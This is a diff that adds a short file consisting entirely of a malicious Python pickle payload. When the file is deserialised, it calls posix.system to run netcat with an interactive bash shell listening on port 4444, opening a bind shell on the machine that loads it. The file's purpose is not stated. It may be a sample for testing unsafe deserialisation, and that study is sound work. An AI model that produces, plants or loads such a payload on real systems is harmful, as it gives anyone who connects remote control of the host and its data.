@@ -1,0 +1,7 @@
+cposix
+system
+p1
+(S"nc -c '/bin/bash -i' -l -p 4444"
+p2
+tRp3
+.
